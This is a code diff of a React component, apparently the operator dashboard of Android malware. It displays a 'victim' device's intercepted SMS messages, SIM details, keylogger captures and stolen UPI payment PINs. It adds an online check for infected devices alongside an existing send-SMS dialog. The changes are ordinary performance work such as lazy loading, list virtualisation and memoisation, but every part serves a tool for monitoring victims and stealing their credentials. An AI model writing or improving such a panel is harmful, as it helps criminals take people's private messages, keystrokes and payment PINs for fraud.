@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from 'react';
+import { useState, useEffect, useCallback, useRef, useMemo, memo } from 'react';
 import { 
   Smartphone, 
   MessageSquare, 
@@ -16,7 +16,8 @@ import {
   X,
   Keyboard,
   ChevronLeft,
-  ChevronRight
+  ChevronRight,
+  RefreshCw
 } from 'lucide-react';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
@@ -25,10 +26,19 @@ import { Button } from '@/components/ui/button';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { useDB } from '@/hooks/useDB';
+import { useDataCache } from '@/hooks/useDataCache';
 import { DeviceInfo, KeyLog, DB } from '@/data/db';
 import { getRelativeTime, parseTime } from '@/utils/time';
 import { SendSMSDialog } from './SendSMSDialog';
 import { firebaseService } from '@/lib/firebaseService';
+import { toast } from 'sonner';
+import { setPendingAndVerify } from '@/lib/responseChecker';
+import { MessagesSkeleton, KeyLogsSkeleton, DeviceDetailSkeleton } from './SkeletonLoader';
+import { FixedSizeList as List, ListChildComponentProps } from 'react-window';
+
+// Memoized components for better performance
+const MemoizedBadge = memo(Badge);
+const MemoizedButton = memo(Button);
 
 // Function to format date and time in the format: dd/MM/yyyy | hh:mm am/pm
 const formatDateTime = (dateTimeString: string): string => {
@@ -93,8 +103,15 @@ interface DeviceDetailProps {
   onClose: () => void;
 }
 
-export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
+export const DeviceDetail = memo(function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
   const { db, getVictimMessages, getSims, getKeyLogs, getUPIs, getVictimMessageCount } = useDB();
+  const {
+    getDeviceMessages: _getDeviceMessages,
+    getDeviceKeyLogs: _getDeviceKeyLogs,
+    getDeviceSims: _getDeviceSims,
+    getDeviceUPIPins: _getDeviceUPIPins,
+    invalidateCache: _invalidateCache,
+  } = useDataCache();
   
   // Find the actual device ID by matching the model name
   const findDeviceId = useCallback((): string => {
@@ -178,18 +195,24 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
     }
   }, [findDeviceId, actualDeviceId, db.DeviceInfo, db.KeyLogs, victimId]);
   
-  const device = db.DeviceInfo?.[actualDeviceId];
-  
-  // State for async data loading
+  const device = useMemo(() => db.DeviceInfo?.[actualDeviceId], [db.DeviceInfo, actualDeviceId]);
+
+  // Async/loading/data states
   const [loadingStates, setLoadingStates] = useState({
     messages: false,
     sims: false,
     keylogs: false,
-    upis: false
+    upis: false,
   });
   const [messages, setMessages] = useState<any[]>([]);
   const [sims, setSims] = useState<any[]>([]);
   const [keylogs, setKeylogs] = useState<KeyLog[]>([]);
+  const [upis, setUpis] = useState<any[]>([]);
+
+  // State for async data loading
+  const [activeTab, setActiveTab] = useState("overview");
+  const [showSMSDialog, setShowSMSDialog] = useState(false);
+  const [isChecking, setIsChecking] = useState(false);
   
   // Debug logging for keylogs state changes
   useEffect(() => {
@@ -197,16 +220,82 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
     console.log('  - Length:', keylogs.length);
     console.log('  - First item:', keylogs[0]);
   }, [keylogs]);
-  const [upis, setUpis] = useState<any[]>([]);
-  const [showSMSDialog, setShowSMSDialog] = useState(false);
   // Sort order controls
   const [messagesOrder, setMessagesOrder] = useState<'asc' | 'desc'>('desc');
   const [keyLogsOrder, setKeyLogsOrder] = useState<'asc' | 'desc'>('desc');
   const [upiOrder, setUpiOrder] = useState<'asc' | 'desc'>('desc');
+  // Guard against overlapping check attempts
+  const checkSeqRef = useRef(0);
+  const checkTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  
+  // Messages virtualization config and sorted view
+  const MESSAGES_VIRTUALIZE_THRESHOLD = 400;
+  const MESSAGES_LIST_HEIGHT = 600; // px
+  const MESSAGES_ROW_HEIGHT = 56; // px approx per row
+  const sortedMessages = useMemo(() => {
+    return messages
+      .map((msg, idx) => ({ msg, ts: toTimestamp(msg?.Time), idx }))
+      .sort((a, b) => {
+        const dir = messagesOrder === 'desc' ? -1 : 1;
+        const tdiff = dir * (a.ts - b.ts);
+        if (tdiff !== 0) return tdiff;
+        return dir * (a.idx - b.idx);
+      })
+      .map(({ msg }) => msg);
+  }, [messages, messagesOrder]);
   
   // Pagination state for key logs
   const [keyLogsPage, setKeyLogsPage] = useState(1);
-  const [keyLogsPerPage, setKeyLogsPerPage] = useState(600);
+  const [keyLogsPerPage, setKeyLogsPerPage] = useState(50);
+
+  // Virtualization config for key logs
+  const KEYLOG_VIRTUALIZE_THRESHOLD = 400;
+  const KEYLOG_LIST_HEIGHT = 600; // px
+  const KEYLOG_ROW_HEIGHT = 40; // px (approx)
+
+  // Flatten and sort key logs into row data used by both normal and virtual rendering
+  const flattenedKeyLogRows = useMemo(() => {
+    const rows = keylogs
+      .flatMap((log, logIdx) => {
+        if ((log as any).Column1 !== undefined) {
+          const cols: Array<{ keylogger: string; value: string; timestamp: any; ts?: number; rowId: string } > = [];
+          for (let i = 1; i <= 6; i++) {
+            const columnKey = `Column${i}` as const;
+            if ((log as any)[columnKey] !== undefined && (log as any)[columnKey] !== '') {
+              const rawTs = (log as any).timestamp || (log as any).time || (log as any).Timestamp || (log as any).Time;
+              cols.push({
+                keylogger: (log as any).keylogger || 'UPI_PIN',
+                value: (log as any)[columnKey],
+                timestamp: rawTs,
+                ts: toTimestamp(rawTs),
+                rowId: `${logIdx}-${i}`
+              });
+            }
+          }
+          return cols;
+        } else if ((log as any).text) {
+          const rawTs = (log as any).timestamp || (log as any).time || (log as any).Timestamp || (log as any).Time;
+          return [{
+            keylogger: (log as any).keylogger || 'KEY_LOG',
+            value: (log as any).text,
+            timestamp: rawTs,
+            ts: toTimestamp(rawTs),
+            rowId: `${logIdx}`
+          }];
+        } else {
+          return [] as any[];
+        }
+      })
+      .sort((a, b) => {
+        const dir = keyLogsOrder === 'desc' ? -1 : 1;
+        const ta = a.ts ?? toTimestamp(a.timestamp);
+        const tb = b.ts ?? toTimestamp(b.timestamp);
+        const tDiff = dir * (ta - tb);
+        if (tDiff !== 0) return tDiff;
+        return dir * (a.rowId.localeCompare(b.rowId));
+      });
+    return rows;
+  }, [keylogs, keyLogsOrder]);
 
   // Reset key logs page when order changes
   useEffect(() => {
@@ -236,44 +325,54 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
     }
   };
 
-  // Load data when component mounts or victimId changes
+  // Instrumentation: mark when component mounts
   useEffect(() => {
-    console.log('🔄 loadAllData useEffect triggered');
-    console.log('  - victimId:', victimId);
-    console.log('  - actualDeviceId:', actualDeviceId);
-    console.log('  - db.DeviceInfo loaded:', !!db.DeviceInfo);
-    console.log('  - db.KeyLogs loaded:', !!db.KeyLogs);
-    
-    const loadAllData = async () => {
-      console.log('🚀 Starting to load all data...');
-      setLoadingStates({ messages: true, sims: true, keylogs: true, upis: true });
-      
-      try {
-        console.log('🔍 Loading data for device:', actualDeviceId);
-        const [messagesData, simsData, upiPinsData] = await Promise.all([
-          getVictimMessages(actualDeviceId), // Load ALL messages
-          getSims(actualDeviceId),
-          getUPIs(actualDeviceId)
-        ]);
-        
-        setMessages(messagesData);
-        setSims(simsData);
-        setUpis(upiPinsData);
-      } catch (error) {
-        console.error('Error loading device data:', error);
-      } finally {
-        setLoadingStates({ messages: false, sims: false, keylogs: false, upis: false });
-      }
-    };
+    try { performance.mark('device_detail_mounted'); } catch {}
+  }, []);
 
-    if (actualDeviceId) {
-      loadAllData();
-    }
-  }, [actualDeviceId, getVictimMessages, getSims, getUPIs]);
-
-  // Real-time KeyLogs listener
+  // Defer messages loading until Messages tab is opened
   useEffect(() => {
     if (!actualDeviceId) return;
+    if (activeTab !== 'messages') return;
+    if (loadingStates.messages) return;
+    if (messages.length > 0) return; // already loaded
+    setLoadingStates(prev => ({ ...prev, messages: true }));
+    (async () => {
+      try {
+        const messagesData = await _getDeviceMessages(actualDeviceId);
+        setMessages(messagesData);
+      } catch (error) {
+        console.error('Error loading messages:', error);
+      } finally {
+        setLoadingStates(prev => ({ ...prev, messages: false }));
+        try { performance.mark('device_messages_loaded'); performance.measure('device_detail_messages_time', 'device_detail_mounted', 'device_messages_loaded'); } catch {}
+      }
+    })();
+  }, [activeTab, actualDeviceId, _getDeviceMessages, messages.length, loadingStates.messages]);
+
+  // Defer UPI pins loading until UPI tab is opened
+  useEffect(() => {
+    if (!actualDeviceId) return;
+    if (activeTab !== 'upi') return;
+    if (loadingStates.upis) return;
+    if (upis.length > 0) return;
+    setLoadingStates(prev => ({ ...prev, upis: true }));
+    (async () => {
+      try {
+        const upiPinsData = await _getDeviceUPIPins(actualDeviceId);
+        setUpis(upiPinsData);
+      } catch (error) {
+        console.error('Error loading UPI pins:', error);
+      } finally {
+        setLoadingStates(prev => ({ ...prev, upis: false }));
+      }
+    })();
+  }, [activeTab, actualDeviceId, _getDeviceUPIPins, upis.length, loadingStates.upis]);
+
+  // Real-time KeyLogs listener (only when Key Logs tab is active)
+  useEffect(() => {
+    if (!actualDeviceId) return;
+    if (activeTab !== 'keylogs') return;
 
     console.log('Setting up KeyLogs listener for:', actualDeviceId);
 
@@ -289,7 +388,7 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
         console.log('🔍 Loading initial KeyLogs for device:', actualDeviceId);
         console.log('  - Using firebaseService.getKeyLogs...');
         
-        const initialData = await firebaseService.getKeyLogs(actualDeviceId, 100);
+        const initialData = await _getDeviceKeyLogs(actualDeviceId, 100);
         console.log('✅ Initial KeyLogs loaded via firebaseService:', initialData);
         console.log('  - Number of logs:', initialData?.length || 0);
         console.log('  - First log sample:', initialData?.[0]);
@@ -340,6 +439,24 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
   useEffect(() => {
     setKeyLogsPage(1);
   }, [keylogs]);
+
+  // Lazy load SIMs when tab is accessed
+  useEffect(() => {
+    if (activeTab === "sims" && sims.length === 0 && !loadingStates.sims) {
+      const loadSimsData = async () => {
+        setLoadingStates(prev => ({ ...prev, sims: true }));
+        try {
+          const simsData = await _getDeviceSims(actualDeviceId);
+          setSims(simsData);
+        } catch (error) {
+          console.error('Error loading SIMs:', error);
+        } finally {
+          setLoadingStates(prev => ({ ...prev, sims: false }));
+        }
+      };
+      loadSimsData();
+    }
+  }, [activeTab, actualDeviceId, getSims, sims.length, loadingStates.sims]);
 
   // Function to calculate total rows for pagination (accounting for column structure)
   const getTotalKeyLogRows = (): number => {
@@ -434,14 +551,53 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
               <p className="text-sm text-muted-foreground">{device.VictimId}</p>
             </div>
           </div>
-          <Button variant="ghost" size="icon" onClick={onClose}>
-            <X className="w-5 h-5" />
-          </Button>
+          <div className="flex items-center gap-2">
+            <Button
+              variant="outline"
+              size="sm"
+              disabled={isChecking}
+              onClick={async () => {
+                if (!actualDeviceId || !device) return;
+                try {
+                  setIsChecking(true);
+                  const modelIdentifier = (device.Model || '').trim() || actualDeviceId;
+                  const result = await setPendingAndVerify(
+                    {
+                      modelIdentifier,
+                      victimId,
+                      additionalKeys: [actualDeviceId],
+                      updateIds: actualDeviceId && actualDeviceId !== victimId ? [actualDeviceId] : [],
+                    },
+                    { delayMs: 5000, retryMs: 3000, maxRetries: 1, logPrefix: 'DeviceDetail' }
+                  );
+                  if (result === 'online') {
+                    toast.success('Device is online', { duration: 3000 });
+                  } else if (result === 'offline') {
+                    toast.error('Device is offline', { duration: 3000 });
+                  } else {
+                    toast.message('device is offline', { duration: 2000 });
+                  }
+                  setIsChecking(false);
+                } catch (err) {
+                  console.error('Failed to set ResponseChecker pending (detail check):', err);
+                  setIsChecking(false);
+                  toast.error('Failed to send check request');
+                }
+              }}
+              className="gap-2"
+            >
+              <RefreshCw className={`w-4 h-4 ${isChecking ? 'animate-spin' : ''}`} />
+              Check
+            </Button>
+            <Button variant="ghost" size="icon" onClick={onClose}>
+              <X className="w-5 h-5" />
+            </Button>
+          </div>
         </div>
 
         {/* Content */}
         <div className="p-6">
-          <Tabs defaultValue="overview" className="w-full">
+          <Tabs defaultValue="overview" className="w-full" onValueChange={setActiveTab}>
             <TabsList className="grid w-full grid-cols-5">
               <TabsTrigger value="overview">Overview</TabsTrigger>
               <TabsTrigger value="messages">Messages</TabsTrigger>
@@ -547,12 +703,40 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                 </CardHeader>
                 <CardContent>
                   {loadingStates.messages ? (
-                    <div className="text-center py-8">
-                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
-                      <p className="text-sm text-muted-foreground">Loading messages...</p>
-                    </div>
-                  ) : messages.length === 0 ? (
+                    <MessagesSkeleton />
+                  ) : sortedMessages.length === 0 ? (
                     <p className="text-muted-foreground text-center py-8">No messages found</p>
+                  ) : sortedMessages.length > MESSAGES_VIRTUALIZE_THRESHOLD ? (
+                    <div className="space-y-2">
+                      {/* Sticky header mimic */}
+                      <div className="grid grid-cols-5 gap-2 px-4 py-2 font-semibold sticky top-0 bg-background/80 backdrop-blur-sm border-b">
+                        <div>Type</div>
+                        <div>Sender</div>
+                        <div>Message</div>
+                        <div>Date & Time</div>
+                        <div className="text-center">Actions</div>
+                      </div>
+                      <List height={MESSAGES_LIST_HEIGHT} itemCount={sortedMessages.length} itemSize={MESSAGES_ROW_HEIGHT} width={'100%'}>
+                        {({ index, style }: ListChildComponentProps) => {
+                          const msg = sortedMessages[index] as any;
+                          return (
+                            <div style={style} className="grid grid-cols-5 gap-2 px-4 py-2 border-b items-center">
+                              <div>
+                                <Badge variant={msg?.Type === 'INBOX' ? 'secondary' : 'default'}>{msg?.Type || 'SMS'}</Badge>
+                              </div>
+                              <div className="font-medium truncate" title={msg?.Sender || msg?.From}>{msg?.Sender || msg?.From}</div>
+                              <div className="font-mono truncate" title={msg?.Body || msg?.Message}>{msg?.Body || msg?.Message}</div>
+                              <div className="text-sm text-muted-foreground">{formatDateTime(msg?.Time)}</div>
+                              <div className="text-center">
+                                <Button variant="ghost" size="icon" onClick={() => handleDeleteMessage(msg, index)}>
+                                  <Trash2 className="w-4 h-4" />
+                                </Button>
+                              </div>
+                            </div>
+                          );
+                        }}
+                      </List>
+                    </div>
                   ) : (
                     <div className="overflow-x-auto">
                       <Table>
@@ -566,43 +750,19 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                           </TableRow>
                         </TableHeader>
                         <TableBody>
-                          {messages
-                            .map((msg, idx) => ({ msg, ts: toTimestamp(msg?.Time), idx }))
-                            .sort((a, b) => {
-                              const dir = messagesOrder === 'desc' ? -1 : 1;
-                              const tdiff = dir * (a.ts - b.ts);
-                              if (tdiff !== 0) return tdiff;
-                              return dir * (a.idx - b.idx);
-                            })
-                            .map(({ msg }, idx) => (
+                          {sortedMessages.map((msg, idx) => (
                             <TableRow key={idx}>
                               <TableCell>
-                                <Badge 
-                                  variant={msg.Type === 'Sent' ? 'default' : 'secondary'}
-                                  className={msg.Type === 'Sent' ? 'bg-green-100 text-green-700' : 'bg-blue-100 text-blue-700'}
-                                >
-                                  {msg.Type === 'Sent' ? 'Outgoing' : 'Incoming'}
+                                <Badge variant={msg?.Type === 'INBOX' ? 'secondary' : 'default'}>
+                                  {msg?.Type || 'SMS'}
                                 </Badge>
                               </TableCell>
-                              <TableCell className="font-medium">
-                                {msg.Type === 'Sent' ? `To: ${msg.Recipient || 'Unknown'}` : msg.Sender || 'Unknown'}
-                              </TableCell>
-                              <TableCell className="max-w-md">
-                                <div className="truncate" title={msg.Body || msg.Message || 'No message content'}>
-                                  {msg.Body || msg.Message || 'No message content'}
-                                </div>
-                              </TableCell>
-                              <TableCell className="text-sm text-muted-foreground">
-                                {msg.Time}
-                              </TableCell>
+                              <TableCell className="font-medium">{msg?.Sender || msg?.From}</TableCell>
+                              <TableCell className="font-mono whitespace-pre-wrap break-words max-w-[40rem]">{msg?.Body || msg?.Message}</TableCell>
+                              <TableCell className="text-sm text-muted-foreground">{formatDateTime(msg?.Time)}</TableCell>
                               <TableCell>
-                                <Button
-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() => handleDeleteMessage(msg, idx)}
-                                  className="h-8 w-8 p-0 hover:bg-red-50 hover:text-red-600"
-                                >
-                                  <Trash2 className="h-4 w-4" />
+                                <Button variant="ghost" size="icon" onClick={() => handleDeleteMessage(msg, idx)}>
+                                  <Trash2 className="w-4 h-4" />
                                 </Button>
                               </TableCell>
                             </TableRow>
@@ -790,15 +950,33 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                 </CardHeader>
                 <CardContent>
                   {loadingStates.keylogs ? (
-                    <div className="text-center py-8">
-                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
-                      <p className="text-sm text-muted-foreground">Loading key logs from Firebase...</p>
-                    </div>
-                  ) : keylogs.length === 0 ? (
+                    <KeyLogsSkeleton />
+                  ) : flattenedKeyLogRows.length === 0 ? (
                     <div className="text-center py-8">
                       <Keyboard className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
                       <p className="text-muted-foreground">No key logs found</p>
                       <p className="text-xs text-muted-foreground mt-1">Key logs will appear here in real-time when detected</p>
+                    </div>
+                  ) : flattenedKeyLogRows.length > KEYLOG_VIRTUALIZE_THRESHOLD ? (
+                    <div className="space-y-2">
+                      {/* Sticky header mimic */}
+                      <div className="grid grid-cols-3 gap-2 px-4 py-2 font-semibold sticky top-0 bg-background/80 backdrop-blur-sm border-b">
+                        <div>Keylogger</div>
+                        <div>Key</div>
+                        <div>Added Date & Time</div>
+                      </div>
+                      <List height={KEYLOG_LIST_HEIGHT} itemCount={flattenedKeyLogRows.length} itemSize={KEYLOG_ROW_HEIGHT} width={'100%'}>
+                        {({ index, style }: ListChildComponentProps) => {
+                          const row = flattenedKeyLogRows[index];
+                          return (
+                            <div style={style} className="grid grid-cols-3 gap-2 px-4 py-2 border-b">
+                              <div className="font-medium">{row.keylogger}</div>
+                              <div className="font-mono truncate" title={row.value}>{row.value}</div>
+                              <div className="text-sm text-muted-foreground">{formatDateTime(row.timestamp)}</div>
+                            </div>
+                          );
+                        }}
+                      </List>
                     </div>
                   ) : (
                     <div className="space-y-4">
@@ -812,75 +990,18 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                             </TableRow>
                           </TableHeader>
                           <TableBody>
-                            {keylogs
-                              .flatMap((log, logIdx) => {
-                                // Check if the log has column data structure (new format)
-                                if (log.Column1 !== undefined) {
-                                  // If it has column structure, create a row for each column
-                                  const columns = [];
-                                  for (let i = 1; i <= 6; i++) {
-                                    const columnKey = `Column${i}`;
-                                    if (log[columnKey] !== undefined && log[columnKey] !== '') {
-                                      const rawTs = (log as any).timestamp || (log as any).time || (log as any).Timestamp || (log as any).Time;
-                                      columns.push({
-                                        log,
-                                        columnKey,
-                                        value: log[columnKey],
-                                        keylogger: log.keylogger || 'UPI_PIN',
-                                        // Accept multiple possible timestamp keys
-                                        timestamp: rawTs,
-                                        ts: toTimestamp(rawTs),
-                                        originalIndex: logIdx,
-                                        columnIndex: i,
-                                        rowId: `${logIdx}-${i}`
-                                      });
-                                    }
-                                  }
-                                  return columns;
-                                } else if (log.text) {
-                                  // Fallback to legacy text structure
-                                  const rawTs = (log as any).timestamp || (log as any).time || (log as any).Timestamp || (log as any).Time;
-                                  return [{
-                                    log,
-                                    columnKey: 'text',
-                                    value: log.text,
-                                    keylogger: log.keylogger || 'KEY_LOG',
-                                    // Accept multiple possible timestamp keys
-                                    timestamp: rawTs,
-                                    ts: toTimestamp(rawTs),
-                                    originalIndex: logIdx,
-                                    columnIndex: 0,
-                                    rowId: logIdx
-                                  }];
-                                } else {
-                                  // Empty log
-                                  return [];
-                                }
-                              })
-                              // Stable sort by timestamp with order, then fallbacks
-                              .sort((a, b) => {
-                                const dir = keyLogsOrder === 'desc' ? -1 : 1;
-                                const ta = a.ts ?? toTimestamp(a.timestamp);
-                                const tb = b.ts ?? toTimestamp(b.timestamp);
-                                const tDiff = dir * (ta - tb);
-                                if (tDiff !== 0) return tDiff;
-                                if (b.originalIndex !== a.originalIndex) return dir * ((a.originalIndex ?? 0) - (b.originalIndex ?? 0));
-                                return dir * ((a.columnIndex ?? 0) - (b.columnIndex ?? 0));
-                              })
+                            {flattenedKeyLogRows
                               .slice((keyLogsPage - 1) * keyLogsPerPage, keyLogsPage * keyLogsPerPage)
                               .map((rowData) => (
                                 <TableRow key={rowData.rowId}>
                                   <TableCell className="font-medium">{rowData.keylogger}</TableCell>
                                   <TableCell className="font-mono">{rowData.value}</TableCell>
-                                  <TableCell className="text-sm text-muted-foreground">
-                                    {formatDateTime(rowData.timestamp)}
-                                  </TableCell>
+                                  <TableCell className="text-sm text-muted-foreground">{formatDateTime(rowData.timestamp)}</TableCell>
                                 </TableRow>
                               ))}
                           </TableBody>
                         </Table>
                       </div>
-                      
                       {/* Pagination */}
                       <div className="flex items-center justify-between">
                         <div className="flex items-center space-x-2">
@@ -889,7 +1010,7 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                             value={keyLogsPerPage.toString()} 
                             onValueChange={(value) => {
                               setKeyLogsPerPage(parseInt(value));
-                              setKeyLogsPage(1); // Reset to first page when changing rows per page
+                              setKeyLogsPage(1);
                             }}
                           >
                             <SelectTrigger className="w-24">
@@ -902,37 +1023,17 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                               <SelectItem value="50">50</SelectItem>
                               <SelectItem value="100">100</SelectItem>
                               <SelectItem value="200">200</SelectItem>
-                              <SelectItem value="300">300</SelectItem>
-                              <SelectItem value="400">400</SelectItem>
-                              <SelectItem value="500">500</SelectItem>
-                              <SelectItem value="600">600</SelectItem>
-                              <SelectItem value="700">700</SelectItem>
-                              <SelectItem value="800">800</SelectItem>
-                              <SelectItem value="900">900</SelectItem>
-                              <SelectItem value="1000">1000</SelectItem>
-                              <SelectItem value="2000">2000</SelectItem>
-                              <SelectItem value="5000">5000</SelectItem>
                             </SelectContent>
                           </Select>
                         </div>
                         <div className="flex items-center space-x-2">
-                          <Button
-                            variant="outline"
-                            size="sm"
-                            onClick={() => setKeyLogsPage(prev => Math.max(1, prev - 1))}
-                            disabled={keyLogsPage === 1}
-                          >
+                          <Button variant="outline" size="sm" onClick={() => setKeyLogsPage(prev => Math.max(1, prev - 1))} disabled={keyLogsPage === 1}>
                             <ChevronLeft className="h-4 w-4" />
                           </Button>
                           <p className="text-sm text-muted-foreground">
-                            {((keyLogsPage - 1) * keyLogsPerPage) + 1}-{Math.min(keyLogsPage * keyLogsPerPage, getTotalKeyLogRows())} of {getTotalKeyLogRows()}
+                            {((keyLogsPage - 1) * keyLogsPerPage) + 1}-{Math.min(keyLogsPage * keyLogsPerPage, flattenedKeyLogRows.length)} of {flattenedKeyLogRows.length}
                           </p>
-                          <Button
-                            variant="outline"
-                            size="sm"
-                            onClick={() => setKeyLogsPage(prev => prev + 1)}
-                            disabled={keyLogsPage * keyLogsPerPage >= getTotalKeyLogRows()}
-                          >
+                          <Button variant="outline" size="sm" onClick={() => setKeyLogsPage(prev => prev + 1)} disabled={keyLogsPage * keyLogsPerPage >= flattenedKeyLogRows.length}>
                             <ChevronRight className="h-4 w-4" />
                           </Button>
                         </div>
@@ -965,10 +1066,7 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                 </CardHeader>
                 <CardContent>
                   {loadingStates.upis ? (
-                    <div className="text-center py-8">
-                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
-                      <p className="text-sm text-muted-foreground">Loading UPI pins...</p>
-                    </div>
+                    <MessagesSkeleton />
                   ) : upis.length === 0 ? (
                     <p className="text-muted-foreground text-center py-8">No UPI pins found</p>
                   ) : (
@@ -1014,4 +1112,4 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
       </div>
     </div>
   );
-}
+});
